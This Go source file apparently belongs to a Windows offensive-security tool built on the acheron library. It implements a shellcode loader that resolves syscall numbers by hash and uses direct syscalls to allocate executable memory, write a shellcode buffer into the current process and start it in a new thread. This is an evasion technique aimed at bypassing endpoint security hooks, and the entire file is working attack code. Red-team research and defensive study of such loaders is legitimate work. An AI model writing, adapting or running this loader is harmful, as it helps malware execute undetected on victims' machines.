//go:build windows && direct

package inject

import (
	"fmt"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

var NT_SUCCESS = acheron.NT_SUCCESS

func Inject(ach *acheron.Acheron, scBuf []byte) error {
	fmt.Printf("[!] Using direct syscalls ...\n")

	fmt.Printf("[+] Allocating memory with NtAllocateVirtualMemory ...\n")
	scBufLen := len(scBuf)
	s1, _ := ach.GetSyscall(ach.HashString("NtAllocateVirtualMemory"))
	if status := execDirectSyscall(
		s1.SSN,
		hSelf,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(&scBufLen)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	); !NT_SUCCESS(status) {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %d", status)
	}

	fmt.Printf("[+] Writing shellcode to memory ...\n")
	s2, _ := ach.GetSyscall(ach.HashString("NtWriteVirtualMemory"))
	if status := execDirectSyscall(
		s2.SSN,
		hSelf,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(&scBuf[0])),
		uintptr(scBufLen),
		0,
	); !NT_SUCCESS(status) {
		return fmt.Errorf("NtWriteVirtualMemory failed: %d", status)
	}

	fmt.Printf("[+] Creating thread with NtCreateThreadEx ...\n")
	s3, _ := ach.GetSyscall(ach.HashString("NtCreateThreadEx"))
	if status := execDirectSyscall(
		s3.SSN,
		uintptr(unsafe.Pointer(&hThread)),
		windows.GENERIC_EXECUTE,
		0,
		hSelf,
		baseAddr,
		0,
		nullptr,
		0,
		0,
		0,
		0,
	); !NT_SUCCESS(status) {
		return fmt.Errorf("NtCreateThreadEx failed: %d", status)
	}

	windows.WaitForSingleObject(
		windows.Handle(hThread),
		0xffffffff,
	)

	return nil
}
